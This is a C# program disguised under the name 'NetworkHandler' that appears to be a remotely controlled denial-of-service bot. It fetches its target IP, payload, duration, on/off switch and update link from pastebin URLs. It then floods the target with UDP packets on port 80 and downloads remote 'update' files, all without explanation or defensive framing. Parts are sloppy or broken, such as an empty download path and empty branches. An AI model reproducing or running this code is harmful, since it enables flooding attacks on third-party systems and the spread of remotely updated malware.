using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Collections.Specialized;
using System.CodeDom.Compiler;


namespace NetworkHandler
{
    internal static class Program
    {
        public static int Milliseconds { get; private set; }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            WebClient client = new WebClient();
            string IPHitFT = client.DownloadString("https://pastebin.com/raw/JA3NkNnZ");
            string IPHit = client.DownloadString("https://pastebin.com/raw/6hwPjhXP");
            string Data = client.DownloadString("https://pastebin.com/raw/5Dhrrn7K");
            string TimeAPI = client.DownloadString("https://pastebin.com/raw/1gANyTRA");
            string Version = client.DownloadString("https://pastebin.com/raw/pXCFUDXZ");
            string download = client.DownloadString("https://pastebin.com/raw/x71a1jW6");
            string scriptTF = client.DownloadString("https://pastebin.com/raw/BSMGFKVQ");
            var script = client.DownloadString("https://pastebin.com/raw/0kCbKm4b");
            UdpClient Client = new UdpClient();
            IPAddress ipAddr = IPAddress.Parse(IPHit);
            System.Threading.Thread.Sleep(Milliseconds);
            int Time = Int32.Parse(TimeAPI);
            DateTime now = DateTime.Now;
            string thisversion = "1.0";
            string username = Environment.UserName;




            while (DateTime.Now.Subtract(now).Seconds < 25)
            {

                if (Version == thisversion)
                {

                }

                else
                {
                    WebClient webClient = new WebClient();
                    webClient.DownloadFile(download ,@"");
                }


                if (scriptTF == "True")
                {

                    

                }

                else
                {

                }



                if (IPHitFT == "True")
                {
                    {

                        while (DateTime.Now.Subtract(now).Seconds < Time)
                            //Wait For the Time

                            try
                            {
                                Client.Connect(ipAddr, 80);
                                byte[] senbytes = Encoding.ASCII.GetBytes(Data);
                                Client.Send(senbytes, senbytes.Length);
                                Client.AllowNatTraversal(true);
                                Client.DontFragment = true;
                            }

                            catch (Exception Err)

                            {
                               
                            }
                    }
                }
                else
                {


                }



            }
        }
    }
}
